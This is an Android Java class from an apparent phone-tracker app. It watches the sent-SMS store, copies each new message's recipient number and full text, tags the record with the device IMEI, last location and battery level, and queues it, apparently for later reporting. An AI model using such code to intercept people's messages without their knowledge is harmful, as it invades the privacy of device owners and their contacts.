package vn.vhc.live;

import java.util.Date;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

public class SmsSentObserver extends ContentObserver {
	
	private static final String TAG = "Ptracker";
    //private static final Uri STATUS_URI = Uri.parse("content://sms");
    private static final Uri STATUS_URI = Uri.parse("content://sms/sent");
    
    
    private Context mContext;
    
	public SmsSentObserver(Handler handler, Context ctx) {
		super(handler);
		mContext = ctx;
	}

	public boolean deliverSelfNotifications() {
		return true;
	}

	public void onChange(boolean selfChange) {
		try{
			//Log.e(TAG, "Notification on SMS observer");
		    Cursor sms_sent_cursor = mContext.getContentResolver().query(STATUS_URI, null, null, null, null);		    
		    if (sms_sent_cursor != null) {
		    	//Toast.makeText(mContext, "Have message sent1:...", Toast.LENGTH_LONG).show();
	    		//while(sms_sent_cursor.moveToNext()){}//fetch to last
		    	sms_sent_cursor.moveToFirst();
		        //while(sms_sent_cursor.moveToNext())
		        {
		        	//sms_sent_cursor.moveToNext();
		        	//if (sms_sent_cursor.moveToFirst()) {				        	
		        	String protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));
		        	
		        	//Log.e(TAG, "protocol : " + protocol);
		        	//Toast.makeText(mContext, "Have message sent2:..."+protocol, Toast.LENGTH_LONG).show();
		    		if(protocol == null)
		    		{
		        		//String[] colNames = sms_sent_cursor.getColumnNames();
		        		//int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
		        		//Toast.makeText(mContext, "Status : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("status")), Toast.LENGTH_LONG).show();
		        		//Log.e(TAG, "SMS Type : " + type);
		        		//if(type == 2)
		        		{
		        			/*
			        		Log.e(TAG, "Id : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("_id")));
			        		Log.e(TAG, "Thread Id : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("thread_id")));
			        		Log.e(TAG, "Address : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")));
			        		Log.e(TAG, "Person : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("person")));
			        		Log.e(TAG, "Date : " + sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date")));
			        		Log.e(TAG, "Read : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("read")));
			        		Log.e(TAG, "Status : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("status")));
			        		Log.e(TAG, "Type : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("type")));
			        		Log.e(TAG, "Rep Path Present : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("reply_path_present")));
			        		Log.e(TAG, "Subject : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("subject")));
			        		Log.e(TAG, "Body : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")));
			        		Log.e(TAG, "Err Code : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("error_code")));
			        		*/
		        			//Toast.makeText(mContext, "To "+sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"))+"==>"+sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")), Toast.LENGTH_LONG).show();
		        			long date=sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date"));
		        			//Toast.makeText(mContext, "Is valid "+(new Date(date+30000).after((new Date()))), Toast.LENGTH_LONG).show();
		        			if((new Date(date+30000).after((new Date()))))
		        		    {
			        			String tel=sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"));
				        		DataObject oSms=new DataObject(LocationUtil.IMEI
				            			, TypeData.SMS_LOG, ContextManagerCore.getInstance().readLastPosition(),  String.valueOf(BatteryLog.levelBattery)
				            			, tel, TypeData.CALL_OUTCOMING,UtilGame.getInstance().GetStringNow());
				    			oSms.set_extradata(sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")));			
				    			//FileUtil.saveTextToTempFile(oSms.toFileString());
				    			UtilMemory.addTo(oSms);
		        			}
			        		/*
			        		if(colNames != null){
			        			for(int k=0; k<colNames.length; k++){
			        				Log.e(TAG, "colNames["+k+"] : " + colNames[k]);
			        			}
			        		}
			        		*/
		        		}
		        	}
		        }
	        }
	        else
	        	Log.e(TAG, "Send Cursor is Empty");
		}
		catch(Exception sggh){
			Log.e(TAG, "Error on onChange : "+sggh.toString());
		}
		super.onChange(selfChange);
	}//fn onChange
}//End of class SmsSentObserver
